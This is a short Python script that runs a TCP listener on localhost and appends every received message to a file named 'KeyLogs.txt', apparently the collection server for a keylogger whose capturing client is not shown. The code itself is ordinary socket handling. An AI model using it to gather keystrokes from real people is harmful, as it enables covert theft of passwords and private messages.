import socket

HOST = "127.0.0.1"  # Standard loopback interface address (localhost)
PORT = 65432  # Port to listen on (non-privileged ports are > 1023)

def receive_data(conn):
    while True:
        data = conn.recv(1024)
        if data:
            data_text = data.decode("utf-8")
            with open("KeyLogs.txt", "a") as myfile:
                myfile.write(data_text)


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    conn, addr = s.accept()
    print(f"Connected by {addr}")
    receive_data(conn)